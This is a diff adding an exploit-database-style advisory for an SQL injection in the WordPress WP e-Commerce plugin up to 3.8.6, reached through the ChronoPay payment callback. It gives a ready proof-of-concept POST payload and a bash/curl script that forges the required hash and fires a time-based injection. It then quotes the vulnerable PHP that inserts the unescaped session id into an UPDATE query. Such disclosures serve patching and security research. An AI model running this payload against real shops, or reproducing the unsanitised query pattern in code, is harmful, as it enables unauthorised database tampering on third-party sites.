@@ -1,0 +1,96 @@
+# Exploit Title: WordPress WP e-Commerce plugin <= 3.8.6 SQL Injection Vulnerability
+# Date: 2011-09-13
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/wp-e-commerce.3.8.6.zip
+# Version: 3.8.6 (tested)
+# Note: parameter $_POST["cs3"] == md5(md5(urldecode($_POST["cs1"])))
+#       it has a "chronopay_salt" option but it's set to '' by default (see more description down below)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/?chronopay_callback=true
+ cs2=chronopay&cs1=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23&cs3=123f7bcd4ba53fade05886a7e77bf045&transaction_type=rebill
+
+e.g.
+#!/bin/bash
+payload="-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"
+hash=`echo -n $payload | md5sum | tr -d '\n' | sed 's/\s*-\s*//g' | md5sum | tr -d '\n' | sed 's/\s*-\s*//g'`
+curl --data "cs2=chronopay&cs1=$payload&cs3=$hash&transaction_type=rebill" http://www.site.com/?chronopay_callback=true
+
+---------------
+Vulnerable code
+---------------
+./wp-e-commerce/wp-shopping-cart.php:
+
+    class WP_eCommerce {
+
+        function WP_eCommerce() {
+            add_action( 'plugins_loaded', array( $this, 'init' ), 8 );
+        }
+
+        function init() {
+            ...
+            $this->load();
+            ...
+        }
+        function load() {
+            ...
+            wpsc_core_load_gateways();
+            ...
+        }
+    ...
+    $wpec = new WP_eCommerce();
+
+
+./wp-e-commerce/wpsc-core/wpsc-functions.php:
+
+    function wpsc_core_load_gateways() {
+        global $nzshpcrt_gateways, $num, $wpsc_gateways,$gateway_checkout_form_fields;
+
+        $gateway_directory      = WPSC_FILE_PATH . '/wpsc-merchants';
+        $nzshpcrt_merchant_list = wpsc_list_dir( $gateway_directory );
+
+        $num = 0;
+        foreach ( $nzshpcrt_merchant_list as $nzshpcrt_merchant ) {
+            if ( stristr( $nzshpcrt_merchant, '.php' ) ) {
+                require( WPSC_FILE_PATH . '/wpsc-merchants/' . $nzshpcrt_merchant );
+            }
+
+
+./wp-e-commerce/wpsc-merchants/chronopay.php:
+
+    function nzshpcrt_chronopay_callback()
+    {
+        ...
+        if(isset($_GET['chronopay_callback']) && ($_GET['chronopay_callback'] == 'true') && ($_POST['cs2'] == 'chronopay'))
+        {
+            $salt = get_option('chronopay_salt'); 
+            // - this is by default '' and set only if explicitly stated 
+            //   inside Store Settings->Payments->General Settings->
+            //   Chronopay->Edit->Security Key
+            // - problem is that there are more popular payment gateways enlisted (e.g. 
+            //   Google Checkout and PayPal) and if that setting is not explicitly set 
+            //   it wide opens the door to the potential attacker
+
+            $gen_hash = md5($salt . md5($_POST['cs1'] . $salt));    
+            
+            if($gen_hash == $_POST['cs3'])
+            {
+                ...
+                $sessionid = trim(stripslashes($_POST['cs1']));
+                $transaction_id = trim(stripslashes($_POST['transaction_id']));
+                $verification_data['trans_id'] = trim(stripslashes($_POST['transaction_id']));
+                $verification_data['trans_type'] = trim(stripslashes($_POST['transaction_type']));
+
+                switch($verification_data['trans_type'])
+                {
+                    ...
+                    case 'rebill':
+                        $wpdb->query("UPDATE `".WPSC_TABLE_PURCHASE_LOGS."` SET 
+                                            `processed` = '2', 
+                                            `transactid` = '".$transaction_id."', 
+                                            `date` = '".time()."'
+                                        WHERE `sessionid` = ".$sessionid." LIMIT 1");
+    ...
+    add_action('init', 'nzshpcrt_chronopay_callback');
